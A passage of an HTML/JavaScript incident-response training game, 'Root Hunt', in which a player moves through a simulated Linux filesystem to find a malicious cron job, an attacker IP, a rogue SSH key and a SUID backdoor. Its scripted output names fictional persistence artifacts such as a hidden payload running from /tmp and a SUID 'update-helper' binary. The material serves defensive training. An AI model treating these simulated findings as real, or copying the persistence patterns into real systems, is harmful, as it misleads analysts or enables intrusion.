@@ -1,0 +1,1662 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>LINUX-FS-02: Root Hunt | Operator</title>
+    <style>
+        *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+        body {
+            background: #0a0c10;
+            color: rgba(255,255,255,0.85);
+            font-family: 'Courier New', monospace;
+            overflow: hidden;
+            height: 100vh;
+            width: 100vw;
+        }
+
+        /* CRT scanlines */
+        body::after {
+            content: '';
+            position: fixed;
+            inset: 0;
+            background: repeating-linear-gradient(
+                0deg,
+                rgba(0,0,0,0.1) 0px,
+                rgba(0,0,0,0.1) 1px,
+                transparent 1px,
+                transparent 3px
+            );
+            pointer-events: none;
+            z-index: 9000;
+        }
+
+        /* ─── Header ─── */
+        .mission-header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 10px 20px;
+            background: #0e1018;
+            border-bottom: 1px solid rgba(57, 255, 20, 0.15);
+            height: 44px;
+            flex-shrink: 0;
+        }
+        .mission-header-back {
+            font-size: 0.75rem;
+            color: rgba(255,255,255,0.4);
+            text-decoration: none;
+            letter-spacing: 0.08em;
+            transition: color 0.2s;
+        }
+        .mission-header-back:hover { color: #39ff14; }
+        .mission-header-title {
+            font-size: 0.7rem;
+            letter-spacing: 0.15em;
+            color: #39ff14;
+            text-transform: uppercase;
+            font-weight: 600;
+        }
+        .mission-header-status {
+            font-size: 0.6rem;
+            letter-spacing: 0.12em;
+            color: rgba(57, 255, 20, 0.4);
+            text-transform: uppercase;
+        }
+
+        /* ─── Objectives Bar ─── */
+        .obj-bar {
+            display: flex;
+            align-items: center;
+            gap: 16px;
+            padding: 7px 20px;
+            background: #0c0e14;
+            border-bottom: 1px solid rgba(57, 255, 20, 0.1);
+            overflow-x: auto;
+            flex-shrink: 0;
+        }
+        .obj-label {
+            font-size: 0.55rem;
+            letter-spacing: 0.15em;
+            color: rgba(57, 255, 20, 0.3);
+            text-transform: uppercase;
+            white-space: nowrap;
+            margin-right: 4px;
+        }
+        .obj-item {
+            display: flex;
+            align-items: center;
+            gap: 5px;
+            font-size: 0.6rem;
+            color: rgba(255, 255, 255, 0.25);
+            letter-spacing: 0.04em;
+            white-space: nowrap;
+            transition: color 0.3s;
+        }
+        .obj-item.complete { color: #39ff14; }
+        .obj-check {
+            width: 13px;
+            height: 13px;
+            border-radius: 3px;
+            border: 1px solid rgba(57, 255, 20, 0.15);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 0.55rem;
+            flex-shrink: 0;
+            transition: all 0.3s;
+        }
+        .obj-item.complete .obj-check {
+            background: rgba(57, 255, 20, 0.15);
+            border-color: #39ff14;
+            color: #39ff14;
+        }
+
+        /* ─── Split Layout ─── */
+        .mission-layout {
+            display: flex;
+            height: calc(100vh - 44px - 30px);
+        }
+
+        /* ─── Map Panel (left 55%) ─── */
+        .map-panel {
+            flex: 0 0 55%;
+            position: relative;
+            overflow: hidden;
+            border-right: 1px solid rgba(57, 255, 20, 0.1);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: #090b0f;
+        }
+        .map-panel::before {
+            content: '';
+            position: absolute;
+            inset: 0;
+            background-image:
+                linear-gradient(rgba(57, 255, 20, 0.015) 1px, transparent 1px),
+                linear-gradient(90deg, rgba(57, 255, 20, 0.015) 1px, transparent 1px);
+            background-size: 30px 30px;
+            pointer-events: none;
+        }
+
+        /* ─── Grid ─── */
+        .grid-container {
+            display: grid;
+            grid-template-columns: repeat(5, 1fr);
+            grid-template-rows: repeat(4, 1fr);
+            gap: 4px;
+            padding: 20px;
+            width: 100%;
+            height: 100%;
+            max-width: 600px;
+            max-height: 480px;
+        }
+
+        .grid-cell {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            border: 1px solid rgba(57, 255, 20, 0.06);
+            border-radius: 4px;
+            position: relative;
+            transition: all 0.4s ease;
+            min-height: 0;
+            overflow: hidden;
+        }
+
+        /* Cell visibility states */
+        .grid-cell.vis-hidden {
+            background: rgba(57, 255, 20, 0.01);
+            border-color: rgba(57, 255, 20, 0.04);
+        }
+        .grid-cell.vis-revealed {
+            background: rgba(57, 255, 20, 0.05);
+            border-color: rgba(57, 255, 20, 0.15);
+        }
+        .grid-cell.vis-visited {
+            background: rgba(57, 255, 20, 0.09);
+            border-color: rgba(57, 255, 20, 0.25);
+        }
+        .grid-cell.current {
+            background: rgba(57, 255, 20, 0.14);
+            border-color: #39ff14;
+            box-shadow: 0 0 12px rgba(57, 255, 20, 0.15), inset 0 0 8px rgba(57, 255, 20, 0.05);
+        }
+        .grid-cell.wall {
+            background: rgba(255, 255, 255, 0.015);
+            border-color: rgba(255, 255, 255, 0.03);
+        }
+        .grid-cell.empty-vis {
+            background: rgba(57, 255, 20, 0.03);
+        }
+
+        /* Firewall & target accent */
+        .grid-cell[data-type="firewall"]:not(.vis-hidden):not(.wall) {
+            border-left: 2px solid rgba(255, 68, 68, 0.4);
+        }
+        .grid-cell[data-type="firewall"].bypassed:not(.vis-hidden) {
+            border-left-color: rgba(57, 255, 20, 0.4);
+        }
+        .grid-cell[data-type="target"]:not(.vis-hidden):not(.wall) {
+            border-left: 2px solid rgba(255, 215, 0, 0.4);
+        }
+
+        /* Cell content */
+        .cell-icon {
+            font-size: 0.85rem;
+            font-weight: 700;
+            letter-spacing: 0.08em;
+            transition: color 0.3s;
+        }
+        .cell-label {
+            font-size: 0.5rem;
+            letter-spacing: 0.06em;
+            margin-top: 2px;
+            transition: color 0.3s;
+            text-align: center;
+        }
+        .vis-hidden .cell-icon { color: rgba(255, 255, 255, 0.06); }
+        .vis-hidden .cell-label { color: transparent; }
+        .vis-revealed .cell-icon { color: rgba(57, 255, 20, 0.45); }
+        .vis-revealed .cell-label { color: rgba(57, 255, 20, 0.2); }
+        .vis-visited .cell-icon { color: rgba(57, 255, 20, 0.7); }
+        .vis-visited .cell-label { color: rgba(57, 255, 20, 0.35); }
+        .current .cell-icon { color: #39ff14; }
+        .current .cell-label { color: rgba(57, 255, 20, 0.6); }
+        .wall .cell-icon { color: rgba(255, 255, 255, 0.04); }
+        .wall .cell-label { color: transparent; }
+
+        /* Agent dot */
+        .cell-agent {
+            width: 10px;
+            height: 10px;
+            border-radius: 50%;
+            background: #39ff14;
+            position: absolute;
+            bottom: 5px;
+            right: 5px;
+            animation: agentPulse 2s ease-in-out infinite;
+            box-shadow: 0 0 6px rgba(57, 255, 20, 0.5);
+        }
+        @keyframes agentPulse {
+            0%, 100% { box-shadow: 0 0 4px rgba(57, 255, 20, 0.3); transform: scale(1); }
+            50% { box-shadow: 0 0 12px rgba(57, 255, 20, 0.7), 0 0 20px rgba(57, 255, 20, 0.15); transform: scale(1.15); }
+        }
+
+        /* Cell reveal animation */
+        @keyframes cellReveal {
+            from { opacity: 0; transform: scale(0.9); }
+            to { opacity: 1; transform: scale(1); }
+        }
+        .grid-cell.just-revealed {
+            animation: cellReveal 0.4s ease-out;
+        }
+
+        /* ─── Terminal Panel (right 45%) ─── */
+        .term-panel {
+            flex: 0 0 45%;
+            display: flex;
+            flex-direction: column;
+            height: 100%;
+            background: #080a0e;
+        }
+        .term-bar {
+            padding: 7px 14px;
+            background: #0c0e14;
+            border-bottom: 1px solid rgba(57, 255, 20, 0.1);
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            flex-shrink: 0;
+        }
+        .term-dot {
+            width: 7px;
+            height: 7px;
+            border-radius: 50%;
+            background: rgba(57, 255, 20, 0.3);
+        }
+        .term-bar-label {
+            font-size: 0.55rem;
+            color: rgba(57, 255, 20, 0.35);
+            letter-spacing: 0.1em;
+            margin-left: 6px;
+        }
+        .term-output {
+            flex: 1;
+            overflow-y: auto;
+            padding: 10px 14px;
+            font-size: 0.78rem;
+            line-height: 1.65;
+        }
+        .term-output::-webkit-scrollbar { width: 4px; }
+        .term-output::-webkit-scrollbar-track { background: transparent; }
+        .term-output::-webkit-scrollbar-thumb { background: rgba(57, 255, 20, 0.15); border-radius: 2px; }
+
+        /* Terminal line types */
+        .term-line { word-break: break-word; }
+        .term-system { color: rgba(57, 255, 20, 0.3); }
+        .term-info { color: rgba(57, 255, 20, 0.65); }
+        .term-success { color: #39ff14; font-weight: 600; }
+        .term-error { color: #ff4444; }
+        .term-warning { color: #ffaa00; }
+        .term-node-info { color: #00ccff; }
+        .term-heading { color: #39ff14; font-weight: 700; }
+        .term-prompt-echo { color: rgba(57, 255, 20, 0.45); }
+
+        /* Terminal input */
+        .term-input-row {
+            display: flex;
+            align-items: center;
+            padding: 8px 14px;
+            border-top: 1px solid rgba(57, 255, 20, 0.1);
+            background: #0a0c12;
+            flex-shrink: 0;
+        }
+        .term-prompt-text {
+            color: #39ff14;
+            font-size: 0.78rem;
+            white-space: nowrap;
+            margin-right: 8px;
+        }
+        .term-input {
+            flex: 1;
+            background: transparent;
+            border: none;
+            outline: none;
+            color: #76ff03;
+            font-family: 'Courier New', monospace;
+            font-size: 0.78rem;
+            caret-color: #39ff14;
+        }
+
+        /* ─── Mission Complete Overlay ─── */
+        .mission-complete {
+            position: fixed;
+            inset: 0;
+            background: rgba(0, 0, 0, 0.88);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 8000;
+            opacity: 0;
+            pointer-events: none;
+            transition: opacity 0.6s;
+        }
+        .mission-complete.visible {
+            opacity: 1;
+            pointer-events: auto;
+        }
+        .mc-card {
+            background: #0e1018;
+            border: 1px solid rgba(57, 255, 20, 0.3);
+            border-radius: 8px;
+            padding: 36px 40px;
+            text-align: center;
+            max-width: 380px;
+            width: 90%;
+        }
+        .mc-badge {
+            font-size: 0.55rem;
+            letter-spacing: 0.2em;
+            color: rgba(57, 255, 20, 0.5);
+            text-transform: uppercase;
+            margin-bottom: 10px;
+        }
+        .mc-title {
+            font-size: 1.3rem;
+            color: #39ff14;
+            letter-spacing: 0.2em;
+            margin-bottom: 6px;
+            text-shadow: 0 0 20px rgba(57, 255, 20, 0.3);
+        }
+        .mc-subtitle {
+            font-size: 0.7rem;
+            color: rgba(255,255,255,0.35);
+            margin-bottom: 28px;
+        }
+        .mc-stats {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 12px;
+            margin-bottom: 28px;
+        }
+        .mc-stat-value {
+            font-size: 1.5rem;
+            color: #39ff14;
+            font-weight: 700;
+        }
+        .mc-stat-label {
+            font-size: 0.55rem;
+            color: rgba(255,255,255,0.25);
+            letter-spacing: 0.08em;
+            margin-top: 3px;
+            text-transform: uppercase;
+        }
+        .mc-btn {
+            display: inline-block;
+            padding: 10px 28px;
+            background: rgba(57, 255, 20, 0.1);
+            border: 1px solid rgba(57, 255, 20, 0.3);
+            border-radius: 4px;
+            color: #39ff14;
+            font-family: 'Courier New', monospace;
+            font-size: 0.7rem;
+            letter-spacing: 0.12em;
+            text-decoration: none;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+        .mc-btn:hover {
+            background: rgba(57, 255, 20, 0.2);
+            border-color: #39ff14;
+            box-shadow: 0 0 15px rgba(57, 255, 20, 0.15);
+        }
+
+        /* ─── Mobile ─── */
+        @media (max-width: 768px) {
+            .mission-layout {
+                flex-direction: column;
+            }
+            .map-panel {
+                flex: 0 0 42%;
+                border-right: none;
+                border-bottom: 1px solid rgba(57, 255, 20, 0.1);
+            }
+            .term-panel {
+                flex: 1;
+            }
+            .obj-bar { gap: 10px; padding: 6px 12px; }
+            .obj-item { font-size: 0.5rem; }
+            .obj-label { font-size: 0.5rem; }
+            .grid-container { padding: 10px; max-height: none; }
+        }
+        @media (max-width: 480px) {
+            .mission-header { padding: 8px 12px; height: 38px; }
+            .mission-header-title { font-size: 0.6rem; }
+            .mission-layout { height: calc(100vh - 38px - 26px); }
+            .cell-label { display: none; }
+            .cell-icon { font-size: 0.7rem; }
+            .cell-agent { width: 8px; height: 8px; bottom: 3px; right: 3px; }
+            .mc-card { padding: 24px; }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Header -->
+    <div class="mission-header">
+        <a href="../index.html" class="mission-header-back">&larr; OPERATOR</a>
+        <div class="mission-header-title">LINUX-FS-02 / ROOT HUNT</div>
+        <div class="mission-header-status" id="header-status">IN PROGRESS</div>
+    </div>
+
+    <!-- Objectives bar -->
+    <div class="obj-bar">
+        <span class="obj-label">OBJ</span>
+        <div class="obj-item" id="obj-0">
+            <span class="obj-check"></span> Find malicious cron
+        </div>
+        <div class="obj-item" id="obj-1">
+            <span class="obj-check"></span> ID attacker IP
+        </div>
+        <div class="obj-item" id="obj-2">
+            <span class="obj-check"></span> Remove SSH key
+        </div>
+        <div class="obj-item" id="obj-3">
+            <span class="obj-check"></span> Find SUID backdoor
+        </div>
+    </div>
+
+    <!-- Split layout -->
+    <div class="mission-layout">
+        <!-- Left: Filesystem Map -->
+        <div class="map-panel">
+            <div class="grid-container" id="grid-container"></div>
+        </div>
+
+        <!-- Right: Terminal -->
+        <div class="term-panel" id="term-panel">
+            <div class="term-bar">
+                <div class="term-dot"></div>
+                <div class="term-dot"></div>
+                <div class="term-dot"></div>
+                <span class="term-bar-label">OPERATOR TERMINAL</span>
+            </div>
+            <div class="term-output" id="term-output"></div>
+            <div class="term-input-row">
+                <span class="term-prompt-text">analyst@linux:~$</span>
+                <input type="text" class="term-input" id="term-input" autocomplete="off" spellcheck="false" autofocus>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mission Complete Overlay -->
+    <div class="mission-complete" id="mission-complete">
+        <div class="mc-card">
+            <div class="mc-badge">MISSION COMPLETE</div>
+            <div class="mc-title">ROOT HUNT</div>
+            <div class="mc-subtitle">Persistence cleared. Server reclaimed.</div>
+            <div class="mc-stats">
+                <div>
+                    <div class="mc-stat-value" id="stat-nodes">0</div>
+                    <div class="mc-stat-label">Dirs</div>
+                </div>
+                <div>
+                    <div class="mc-stat-value" id="stat-commands">0</div>
+                    <div class="mc-stat-label">Commands</div>
+                </div>
+                <div>
+                    <div class="mc-stat-value" id="stat-time">0s</div>
+                    <div class="mc-stat-label">Time</div>
+                </div>
+            </div>
+            <a href="../index.html" class="mc-btn">RETURN TO OPERATOR</a>
+        </div>
+    </div>
+
+<script>
+/* ═══════════════════════════════════════════════════════════
+   LINUX-FS-02: Root Hunt — Mission Engine
+   ═══════════════════════════════════════════════════════════ */
+
+// ─── Grid Map ───
+// Rows 0-3, Cols 0-4 (filesystem directories as nodes)
+const GRID_MAP = [
+    ['etc-cron',   'var-log',    'empty',      'wall',       'wall'],
+    ['empty',      'home-admin', 'empty',       'ssh-config', 'wall'],
+    ['wall',       'tmp-hidden', 'empty',       'empty',      'usr-sbin'],
+    ['wall',       'empty',      'proc-list',   'root-dir',   'empty']
+];
+
+const ROWS = 4;
+const COLS = 5;
+
+// ─── Cell Info ───
+const CELL_INFO = {
+    'etc-cron':   { label: '/ETC/CRON.D',  abbr: 'CRN', ip: 'srv-web01', desc: 'Cron job directory — scheduled task definitions',         ports: ['N/A'],    os: 'Ubuntu 22.04 LTS' },
+    'var-log':    { label: '/VAR/LOG',      abbr: 'LOG', ip: 'srv-web01', desc: 'System log directory — auth.log, syslog, kern.log',       ports: ['N/A'],    os: 'Ubuntu 22.04 LTS' },
+    'home-admin': { label: '/HOME/ADMIN',   abbr: 'HME', ip: 'srv-web01', desc: 'Admin user home directory',                               ports: ['N/A'],    os: 'Ubuntu 22.04 LTS' },
+    'ssh-config': { label: '/ETC/SSH',      abbr: 'SSH', ip: 'srv-web01', desc: 'SSH server configuration and authorized keys',           ports: ['22/SSH'], os: 'OpenSSH 9.6' },
+    'tmp-hidden': { label: '/TMP/.CACHE',   abbr: 'TMP', ip: 'srv-web01', desc: 'Hidden temp directory — suspicious artifacts',            ports: ['N/A'],    os: 'Ubuntu 22.04 LTS' },
+    'usr-sbin':   { label: '/USR/SBIN',     abbr: 'BIN', ip: 'srv-web01', desc: 'System binaries — administrative commands',              ports: ['N/A'],    os: 'Ubuntu 22.04 LTS' },
+    'proc-list':  { label: '/PROC',         abbr: 'PRC', ip: 'srv-web01', desc: 'Process listing — running daemons and services',         ports: ['N/A'],    os: 'Ubuntu 22.04 LTS' },
+    'root-dir':   { label: '/ROOT',         abbr: 'ROT', ip: 'srv-web01', desc: 'Root user home directory',                               ports: ['N/A'],    os: 'Ubuntu 22.04 LTS' }
+};
+
+// ─── Game State ───
+let STATE = {
+    position: { col: 0, row: 0 },
+    visibility: {},
+    objectives: [false, false, false, false],
+    nodesDiscovered: new Set(),
+    commandCount: 0,
+    commandHistory: [],
+    historyIndex: -1,
+    startTime: Date.now(),
+    completed: false,
+    // Mission-specific state
+    maliciousCronFound: false,
+    attackerIPFound: false,
+    sshKeyRemoved: false,
+    suidBackdoorFound: false
+};
+
+// ─── Objective labels ───
+const OBJ_LABELS = [
+    'MALICIOUS CRON FOUND — backdoor scheduled task identified',
+    'ATTACKER IP IDENTIFIED — source of compromise confirmed',
+    'SSH KEY REMOVED — unauthorized access key purged',
+    'SUID BACKDOOR FOUND — privilege escalation binary identified'
+];
+
+// ═══ Grid Rendering ═══
+
+function buildGrid() {
+    const container = document.getElementById('grid-container');
+    container.innerHTML = '';
+    for (let r = 0; r < ROWS; r++) {
+        for (let c = 0; c < COLS; c++) {
+            const cell = document.createElement('div');
+            cell.className = 'grid-cell';
+            cell.dataset.col = c;
+            cell.dataset.row = r;
+            cell.dataset.type = GRID_MAP[r][c];
+
+            const icon = document.createElement('div');
+            icon.className = 'cell-icon';
+
+            const label = document.createElement('div');
+            label.className = 'cell-label';
+
+            const agent = document.createElement('div');
+            agent.className = 'cell-agent';
+            agent.style.display = 'none';
+
+            cell.appendChild(icon);
+            cell.appendChild(label);
+            cell.appendChild(agent);
+            container.appendChild(cell);
+        }
+    }
+}
+
+function updateGrid() {
+    for (let r = 0; r < ROWS; r++) {
+        for (let c = 0; c < COLS; c++) {
+            const cell = document.querySelector(`.grid-cell[data-col="${c}"][data-row="${r}"]`);
+            if (!cell) continue;
+
+            const type = GRID_MAP[r][c];
+            const key = c + ',' + r;
+            const vis = STATE.visibility[key] || 'hidden';
+            const isCurrent = STATE.position.col === c && STATE.position.row === r;
+
+            // Reset classes
+            cell.className = 'grid-cell';
+            cell.dataset.col = c;
+            cell.dataset.row = r;
+            cell.dataset.type = type;
+
+            if (type === 'wall') {
+                cell.classList.add('wall');
+            } else if (isCurrent) {
+                cell.classList.add('current');
+            } else {
+                cell.classList.add('vis-' + vis);
+                if (type === 'empty' && vis !== 'hidden') cell.classList.add('empty-vis');
+            }
+
+            // Content
+            const iconEl = cell.querySelector('.cell-icon');
+            const labelEl = cell.querySelector('.cell-label');
+            const agentEl = cell.querySelector('.cell-agent');
+
+            if (type === 'wall') {
+                iconEl.textContent = '';
+                labelEl.textContent = '';
+            } else if (vis === 'hidden' && !isCurrent) {
+                iconEl.textContent = '?';
+                labelEl.textContent = '';
+            } else if (type === 'empty') {
+                iconEl.textContent = '\u00B7';
+                labelEl.textContent = '';
+            } else {
+                const info = CELL_INFO[type];
+                iconEl.textContent = info.abbr;
+                labelEl.textContent = (vis === 'visited' || isCurrent) ? info.label : '';
+            }
+
+            agentEl.style.display = isCurrent ? 'block' : 'none';
+        }
+    }
+}
+
+// ═══ Fog of War ═══
+
+function revealAdjacent(col, row) {
+    const dirs = [[0,-1],[0,1],[1,0],[-1,0]];
+    dirs.forEach(function(d) {
+        const nc = col + d[0];
+        const nr = row + d[1];
+        if (nc < 0 || nc >= COLS || nr < 0 || nr >= ROWS) return;
+        if (GRID_MAP[nr][nc] === 'wall') return;
+        const key = nc + ',' + nr;
+        if (!STATE.visibility[key] || STATE.visibility[key] === 'hidden') {
+            STATE.visibility[key] = 'revealed';
+            // Trigger reveal animation
+            const cell = document.querySelector(`.grid-cell[data-col="${nc}"][data-row="${nr}"]`);
+            if (cell) {
+                cell.classList.add('just-revealed');
+                setTimeout(function() { cell.classList.remove('just-revealed'); }, 500);
+            }
+        }
+    });
+}
+
+// ═══ Terminal Output ═══
+
+function printLine(text, type) {
+    const output = document.getElementById('term-output');
+    const line = document.createElement('div');
+    line.className = 'term-line term-' + (type || 'system');
+    line.textContent = text;
+    output.appendChild(line);
+
+    // Cap at 200 lines
+    while (output.children.length > 200) {
+        output.removeChild(output.firstChild);
+    }
+    output.scrollTop = output.scrollHeight;
+}
+
+// ═══ Node Resolution ═══
+
+function resolveNode(query) {
+    var q = query.toLowerCase();
+    var exact = [];
+    var partial = [];
+
+    for (var r = 0; r < ROWS; r++) {
+        for (var c = 0; c < COLS; c++) {
+            var type = GRID_MAP[r][c];
+            if (type === 'empty' || type === 'wall') continue;
+            var info = CELL_INFO[type];
+            var vis = STATE.visibility[c + ',' + r] || 'hidden';
+            var entry = { type: type, col: c, row: r, visibility: vis, info: info };
+
+            if (q === type || q === info.label.toLowerCase() || q === info.ip || q === info.abbr.toLowerCase()) {
+                exact.push(entry);
+            } else if (type.indexOf(q) !== -1 || info.label.toLowerCase().indexOf(q) !== -1) {
+                partial.push(entry);
+            }
+        }
+    }
+
+    var results = exact.length > 0 ? exact : partial;
+
+    if (results.length === 1) return results[0];
+    if (results.length > 1) {
+        printLine('Multiple matches. Be more specific:', 'warning');
+        results.forEach(function(m) {
+            printLine('  ' + m.info.label + ' (' + m.info.ip + ')', 'info');
+        });
+        return null;
+    }
+    return null;
+}
+
+// ─── Current node type helper ───
+function currentNodeType() {
+    return GRID_MAP[STATE.position.row][STATE.position.col];
+}
+
+// ═══ Command Handlers ═══
+
+function cmdHelp() {
+    printLine('', 'system');
+    printLine('\u2550\u2550\u2550 COMMAND REFERENCE \u2550\u2550\u2550', 'heading');
+    printLine('  scan              Survey area, reveal adjacent directories', 'info');
+    printLine('  move <dir>        Move analyst (north/south/east/west or n/s/e/w)', 'info');
+    printLine('  ls                List contents of current directory', 'info');
+    printLine('  cat <file>        Read a file in current directory', 'info');
+    printLine('  find              Find SUID binaries (effective in /USR/SBIN)', 'info');
+    printLine('  grep <pattern>    Search logs (effective in /VAR/LOG)', 'info');
+    printLine('  crontab <flag>    Manage cron jobs (effective in /ETC/CRON.D)', 'info');
+    printLine('  remove <target>   Remove a persistence artifact (effective in /ETC/SSH)', 'info');
+    printLine('  status            Show position and investigation findings', 'info');
+    printLine('  help              Show this reference', 'info');
+    printLine('  clear             Clear terminal output', 'info');
+    printLine('', 'system');
+    printLine('Navigate to each directory and investigate with the appropriate command.', 'system');
+    printLine('Examples: ls, cat .data-sync, grep 185, find, crontab -l', 'system');
+}
+
+function cmdScan() {
+    var col = STATE.position.col;
+    var row = STATE.position.row;
+    var cellType = GRID_MAP[row][col];
+
+    printLine('Scanning filesystem...', 'system');
+    printLine('', 'system');
+
+    // Current position info
+    if (cellType !== 'empty' && cellType !== 'wall') {
+        var cur = CELL_INFO[cellType];
+        printLine('Current: ' + cur.label + ' on ' + cur.ip, 'heading');
+        printLine(cur.desc, 'info');
+    } else {
+        printLine('Current: Filesystem path (no notable directory)', 'heading');
+    }
+
+    printLine('', 'system');
+    printLine('Adjacent:', 'heading');
+
+    var dirs = [
+        { name: 'North', dc: 0, dr: -1 },
+        { name: 'South', dc: 0, dr: 1 },
+        { name: 'East',  dc: 1, dr: 0 },
+        { name: 'West',  dc: -1, dr: 0 }
+    ];
+
+    dirs.forEach(function(d) {
+        var nc = col + d.dc;
+        var nr = row + d.dr;
+        if (nc < 0 || nc >= COLS || nr < 0 || nr >= ROWS) {
+            printLine('  ' + d.name + ': [filesystem boundary]', 'system');
+            return;
+        }
+        var type = GRID_MAP[nr][nc];
+        if (type === 'wall') {
+            printLine('  ' + d.name + ': [no path]', 'system');
+            return;
+        }
+        // Reveal adjacent cell
+        var key = nc + ',' + nr;
+        if (!STATE.visibility[key] || STATE.visibility[key] === 'hidden') {
+            STATE.visibility[key] = 'revealed';
+        }
+        if (type === 'empty') {
+            printLine('  ' + d.name + ': Filesystem path', 'info');
+        } else {
+            var info = CELL_INFO[type];
+            printLine('  ' + d.name + ': ' + info.label + ' on ' + info.ip, 'node-info');
+        }
+    });
+
+    updateGrid();
+    saveState();
+}
+
+function cmdMove(args) {
+    if (!args.length) {
+        printLine('Usage: move <direction>', 'error');
+        printLine('Directions: north/south/east/west (or n/s/e/w)', 'system');
+        return;
+    }
+
+    var dirMap = {
+        'north': [0,-1], 'n': [0,-1],
+        'south': [0,1],  's': [0,1],
+        'east':  [1,0],  'e': [1,0],
+        'west':  [-1,0], 'w': [-1,0]
+    };
+
+    var dir = args[0].toLowerCase();
+    if (!dirMap[dir]) {
+        printLine('Unknown direction: ' + args[0], 'error');
+        printLine('Use: north/south/east/west (or n/s/e/w)', 'system');
+        return;
+    }
+
+    var d = dirMap[dir];
+    var newCol = STATE.position.col + d[0];
+    var newRow = STATE.position.row + d[1];
+
+    // Bounds check
+    if (newCol < 0 || newCol >= COLS || newRow < 0 || newRow >= ROWS) {
+        printLine('No path beyond filesystem boundary.', 'error');
+        return;
+    }
+
+    var cellType = GRID_MAP[newRow][newCol];
+
+    // Wall check
+    if (cellType === 'wall') {
+        printLine('No traversable path ' + dir + '.', 'error');
+        return;
+    }
+
+    // Move analyst
+    STATE.position = { col: newCol, row: newRow };
+    STATE.visibility[newCol + ',' + newRow] = 'visited';
+
+    if (cellType !== 'empty') {
+        STATE.nodesDiscovered.add(cellType);
+    }
+
+    revealAdjacent(newCol, newRow);
+
+    // Print move result
+    var dirFull = { n:'north', s:'south', e:'east', w:'west' };
+    var dirName = dirFull[dir] || dir;
+    if (cellType === 'empty') {
+        printLine('cd ' + dirName + '... filesystem path.', 'system');
+    } else {
+        var info = CELL_INFO[cellType];
+        printLine('cd ' + info.label, 'success');
+        printLine(info.desc, 'info');
+    }
+
+    checkObjectives();
+    updateGrid();
+    saveState();
+}
+
+function cmdLs() {
+    var node = currentNodeType();
+
+    printLine('', 'system');
+
+    switch (node) {
+        case 'etc-cron':
+            printLine('total 24', 'system');
+            printLine('drwxr-xr-x  root root  cron.daily/', 'info');
+            printLine('drwxr-xr-x  root root  cron.hourly/', 'info');
+            printLine('drwxr-xr-x  root root  cron.weekly/', 'info');
+            printLine('-rw-r--r--  root root  system-update', 'info');
+            printLine('-rw-r--r--  root root  logrotate', 'info');
+            printLine('-rw-r--r--  root root  apt-daily', 'info');
+            printLine('-rw-r--r--  root root  .data-sync      <- [SUSPICIOUS]', 'warning');
+            printLine('', 'system');
+            printLine('Hint: cat .data-sync to inspect the suspicious file.', 'system');
+            break;
+
+        case 'var-log':
+            printLine('total 1.2G', 'system');
+            printLine('-rw-r--r--  root root  auth.log', 'info');
+            printLine('-rw-r--r--  root root  syslog', 'info');
+            printLine('-rw-r--r--  root root  kern.log', 'info');
+            printLine('-rw-r--r--  root root  dpkg.log', 'info');
+            printLine('-rw-r--r--  root root  apache2/access.log', 'info');
+            printLine('-rw-r--r--  root root  apache2/error.log', 'info');
+            printLine('', 'system');
+            printLine('Hint: cat auth.log or grep <pattern> to search logs.', 'system');
+            break;
+
+        case 'home-admin':
+            printLine('total 48', 'system');
+            printLine('-rw-r--r--  admin admin  .bashrc', 'info');
+            printLine('-rw-r--r--  admin admin  .bash_history', 'info');
+            printLine('-rw-r--r--  admin admin  .bash_logout', 'info');
+            printLine('drwxr-xr-x  admin admin  Documents/', 'info');
+            printLine('drwxr-xr-x  admin admin  Downloads/', 'info');
+            printLine('drwx------  admin admin  .ssh/', 'info');
+            printLine('', 'system');
+            printLine('Hint: cat .bash_history to see recent commands.', 'system');
+            break;
+
+        case 'ssh-config':
+            printLine('total 16', 'system');
+            printLine('-rw-r--r--  root root  sshd_config', 'info');
+            printLine('-rw-------  root root  ssh_host_rsa_key', 'info');
+            printLine('-rw-r--r--  root root  ssh_host_rsa_key.pub', 'info');
+            printLine('-rw-r--r--  root root  ssh_host_ed25519_key.pub', 'info');
+            printLine('-rw-r--r--  root root  authorized_keys', 'info');
+            printLine('', 'system');
+            printLine('Hint: cat authorized_keys to check for unauthorized keys.', 'system');
+            break;
+
+        case 'tmp-hidden':
+            printLine('total 3', 'system');
+            printLine('-rwxr-xr-x  root root  .payload.elf', 'warning');
+            printLine('-rw-r--r--  root root  .config.dat', 'warning');
+            printLine('-rw-r--r--  root root  .pid', 'warning');
+            printLine('', 'system');
+            printLine('[!] All files hidden (dot-prefixed). Attacker staging area.', 'warning');
+            printLine('Hint: cat .config.dat to read configuration.', 'system');
+            break;
+
+        case 'usr-sbin':
+            printLine('total 280', 'system');
+            printLine('-rwsr-xr-x  root root  adduser', 'info');
+            printLine('-rwxr-xr-x  root root  apache2ctl', 'info');
+            printLine('-rwsr-xr-x  root root  passwd', 'info');
+            printLine('-rwxr-xr-x  root root  service', 'info');
+            printLine('-rwsr-xr-x  root root  sudo', 'info');
+            printLine('-rwsr-xr-x  root root  update-helper   <- [SUSPICIOUS]', 'warning');
+            printLine('-rwxr-xr-x  root root  useradd', 'info');
+            printLine('', 'system');
+            printLine('[!] update-helper has SUID bit. Not a standard system binary.', 'warning');
+            printLine('Hint: use "find" to enumerate all SUID binaries.', 'system');
+            break;
+
+        case 'proc-list':
+            printLine('PID    USER      COMMAND', 'heading');
+            printLine('1      root      /sbin/init', 'info');
+            printLine('412    root      /usr/sbin/sshd -D', 'info');
+            printLine('881    www-data  /usr/sbin/apache2 -k start', 'info');
+            printLine('1024   root      /usr/sbin/cron -f', 'info');
+            printLine('1337   root      /tmp/.cache/.payload.elf --daemon  <- [SUSPICIOUS]', 'warning');
+            printLine('2201   root      update-helper --interval 300       <- [SUSPICIOUS]', 'warning');
+            printLine('', 'system');
+            printLine('[!] PID 1337: payload running from /tmp/.cache/ — attacker persistence.', 'warning');
